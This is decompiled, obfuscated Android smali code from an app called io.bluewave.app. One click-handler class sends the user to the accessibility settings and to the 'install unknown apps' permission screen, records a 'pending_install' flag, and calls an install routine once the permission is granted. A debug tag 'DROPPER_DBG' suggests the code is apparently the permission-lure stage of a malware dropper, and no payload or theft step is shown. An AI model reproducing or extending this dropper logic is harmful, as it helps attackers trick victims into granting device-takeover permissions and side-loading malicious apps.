.class public final synthetic LU4clZ2NNNKj5ZWU/vpNdwwpwBwplN;
.super Ljava/lang/Object;
.source "r8-map-id-9b89e78e9c5e8923134474d94771b179d9c458b216b15abf6fb75f52fa5f6b53"

# interfaces
.implements Landroid/view/View$OnClickListener;


# instance fields
.field public final synthetic ECM0w2UpL85TD4rnc:Lio/bluewave/app/MainActivity;

.field public final synthetic VYRgR7ZqgbZj3I16R:I


# direct methods
.method public synthetic constructor <init>(Lio/bluewave/app/MainActivity;I)V
    .locals 0

    .line 1
    iput p2, p0, LU4clZ2NNNKj5ZWU/vpNdwwpwBwplN;->VYRgR7ZqgbZj3I16R:I

    .line 2
    .line 3
    iput-object p1, p0, LU4clZ2NNNKj5ZWU/vpNdwwpwBwplN;->ECM0w2UpL85TD4rnc:Lio/bluewave/app/MainActivity;

    .line 4
    .line 5
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 6
    .line 7
    .line 8
    return-void
.end method


# virtual methods
.method public final onClick(Landroid/view/View;)V
    .locals 10

    .line 1
    iget p1, p0, LU4clZ2NNNKj5ZWU/vpNdwwpwBwplN;->VYRgR7ZqgbZj3I16R:I

    .line 2
    .line 3
    const/4 v0, 0x1

    .line 4
    iget-object v1, p0, LU4clZ2NNNKj5ZWU/vpNdwwpwBwplN;->ECM0w2UpL85TD4rnc:Lio/bluewave/app/MainActivity;

    .line 5
    .line 6
    packed-switch p1, :pswitch_data_0

    .line 7
    .line 8
    .line 9
    sget p1, Lio/bluewave/app/MainActivity;->LnOhZ86vZb2ZCRzVz:I

    .line 10
    .line 11
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 12
    .line 13
    .line 14
    :try_start_0
    new-instance p1, Landroid/content/Intent;

    .line 15
    .line 16
    const-string v0, "android.settings.ACCESSIBILITY_SETTINGS"

    .line 17
    .line 18
    invoke-direct {p1, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 19
    .line 20
    .line 21
    invoke-virtual {v1, p1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 22
    .line 23
    .line 24
    goto :goto_0

    .line 25
    :catch_0
    move-exception p1

    .line 26
    new-instance v0, Ljava/lang/StringBuilder;

    .line 27
    .line 28
    const-string v1, "Cannot open accessibility settings: "

    .line 29
    .line 30
    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 31
    .line 32
    .line 33
    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 34
    .line 35
    .line 36
    move-result-object p1

    .line 37
    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 38
    .line 39
    .line 40
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 41
    .line 42
    .line 43
    move-result-object p1

    .line 44
    const-string v0, "DROPPER_DBG"

    .line 45
    .line 46
    invoke-static {v0, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 47
    .line 48
    .line 49
    :goto_0
    return-void

    .line 50
    :pswitch_0
    iget-boolean p1, v1, Lio/bluewave/app/MainActivity;->UgIxXQ6S7mmUt2naV:Z

    .line 51
    .line 52
    if-eqz p1, :cond_0

    .line 53
    .line 54
    goto :goto_2

    .line 55
    :cond_0
    invoke-virtual {v1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    .line 56
    .line 57
    .line 58
    move-result-object p1

    .line 59
    invoke-virtual {p1}, Landroid/content/pm/PackageManager;->canRequestPackageInstalls()Z

    .line 60
    .line 61
    .line 62
    move-result p1

    .line 63
    if-nez p1, :cond_2

    .line 64
    .line 65
    iget-object p1, v1, Lio/bluewave/app/MainActivity;->VYRgR7ZqgbZj3I16R:Landroid/widget/ViewFlipper;

    .line 66
    .line 67
    const/high16 v2, 0x10a0000

    .line 68
    .line 69
    invoke-virtual {p1, v1, v2}, Landroid/widget/ViewAnimator;->setInAnimation(Landroid/content/Context;I)V

    .line 70
    .line 71
    .line 72
    iget-object p1, v1, Lio/bluewave/app/MainActivity;->VYRgR7ZqgbZj3I16R:Landroid/widget/ViewFlipper;

    .line 73
    .line 74
    const v2, 0x10a0001

    .line 75
    .line 76
    .line 77
    invoke-virtual {p1, v1, v2}, Landroid/widget/ViewAnimator;->setOutAnimation(Landroid/content/Context;I)V

    .line 78
    .line 79
    .line 80
    iget-object p1, v1, Lio/bluewave/app/MainActivity;->VYRgR7ZqgbZj3I16R:Landroid/widget/ViewFlipper;

    .line 81
    .line 82
    const/4 v2, 0x2

    .line 83
    invoke-virtual {p1, v2}, Landroid/widget/ViewAnimator;->setDisplayedChild(I)V

    .line 84
    .line 85
    .line 86
    iget-object p1, v1, Lio/bluewave/app/MainActivity;->VYRgR7ZqgbZj3I16R:Landroid/widget/ViewFlipper;

    .line 87
    .line 88
    invoke-virtual {p1, v2}, Landroid/view/ViewGroup;->getChildAt(I)Landroid/view/View;

    .line 89
    .line 90
    .line 91
    move-result-object p1

    .line 92
    if-nez p1, :cond_1

    .line 93
    .line 94
    goto :goto_2

    .line 95
    :cond_1
    new-instance v2, Ljava/util/ArrayList;

    .line 96
    .line 97
    invoke-direct {v2}, Ljava/util/ArrayList;-><init>()V

    .line 98
    .line 99
    .line 100
    invoke-static {p1, v2}, Lio/bluewave/app/MainActivity;->UgIxXQ6S7mmUt2naV(Landroid/view/View;Ljava/util/ArrayList;)V

    .line 101
    .line 102
    .line 103
    invoke-virtual {v2}, Ljava/util/ArrayList;->size()I

    .line 104
    .line 105
    .line 106
    move-result p1

    .line 107
    const/4 v3, 0x0

    .line 108
    move v4, v3

    .line 109
    :goto_1
    if-ge v4, p1, :cond_3

    .line 110
    .line 111
    invoke-virtual {v2, v4}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    .line 112
    .line 113
    .line 114
    move-result-object v5

    .line 115
    add-int/lit8 v4, v4, 0x1

    .line 116
    .line 117
    check-cast v5, Landroid/view/View;

    .line 118
    .line 119
    const/4 v6, 0x0

    .line 120
    invoke-virtual {v5, v6}, Landroid/view/View;->setAlpha(F)V

    .line 121
    .line 122
    .line 123
    const/16 v6, 0x19

    .line 124
    .line 125
    invoke-virtual {v1, v6}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 126
    .line 127
    .line 128
    move-result v6

    .line 129
    int-to-float v6, v6

    .line 130
    invoke-virtual {v5, v6}, Landroid/view/View;->setTranslationY(F)V

    .line 131
    .line 132
    .line 133
    iget-object v6, v1, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW:Landroid/os/Handler;

    .line 134
    .line 135
    new-instance v7, LU4clZ2NNNKj5ZWU/WAxAMT28akcO;

    .line 136
    .line 137
    invoke-direct {v7, v5, v0}, LU4clZ2NNNKj5ZWU/WAxAMT28akcO;-><init>(Landroid/view/View;I)V

    .line 138
    .line 139
    .line 140
    int-to-long v8, v3

    .line 141
    invoke-virtual {v6, v7, v8, v9}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 142
    .line 143
    .line 144
    add-int/lit8 v3, v3, 0x64

    .line 145
    .line 146
    goto :goto_1

    .line 147
    :cond_2
    invoke-virtual {v1}, Lio/bluewave/app/MainActivity;->HrAWa37pvWeygr()V

    .line 148
    .line 149
    .line 150
    :cond_3
    :goto_2
    return-void

    .line 151
    :pswitch_1
    sget p1, Lio/bluewave/app/MainActivity;->LnOhZ86vZb2ZCRzVz:I

    .line 152
    .line 153
    invoke-virtual {v1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    .line 154
    .line 155
    .line 156
    move-result-object p1

    .line 157
    invoke-virtual {p1}, Landroid/content/pm/PackageManager;->canRequestPackageInstalls()Z

    .line 158
    .line 159
    .line 160
    move-result p1

    .line 161
    if-eqz p1, :cond_4

    .line 162
    .line 163
    invoke-virtual {v1}, Lio/bluewave/app/MainActivity;->HrAWa37pvWeygr()V

    .line 164
    .line 165
    .line 166
    goto :goto_3

    .line 167
    :cond_4
    iput-boolean v0, v1, Lio/bluewave/app/MainActivity;->vQMbLPlYT1awb32bcs:Z

    .line 168
    .line 169
    iget-object p1, v1, Lio/bluewave/app/MainActivity;->HrAWa37pvWeygr:Landroid/content/SharedPreferences;

    .line 170
    .line 171
    invoke-interface {p1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    .line 172
    .line 173
    .line 174
    move-result-object p1

    .line 175
    const-string v2, "pending_install"

    .line 176
    .line 177
    invoke-interface {p1, v2, v0}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 178
    .line 179
    .line 180
    move-result-object p1

    .line 181
    invoke-interface {p1}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 182
    .line 183
    .line 184
    new-instance p1, Landroid/content/Intent;

    .line 185
    .line 186
    new-instance v0, Ljava/lang/StringBuilder;

    .line 187
    .line 188
    const-string v2, "package:"

    .line 189
    .line 190
    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 191
    .line 192
    .line 193
    invoke-virtual {v1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    .line 194
    .line 195
    .line 196
    move-result-object v2

    .line 197
    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 198
    .line 199
    .line 200
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 201
    .line 202
    .line 203
    move-result-object v0

    .line 204
    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    .line 205
    .line 206
    .line 207
    move-result-object v0

    .line 208
    const-string v2, "android.settings.MANAGE_UNKNOWN_APP_SOURCES"

    .line 209
    .line 210
    invoke-direct {p1, v2, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    .line 211
    .line 212
    .line 213
    invoke-virtual {v1, p1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 214
    .line 215
    .line 216
    :goto_3
    return-void

    .line 217
    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method
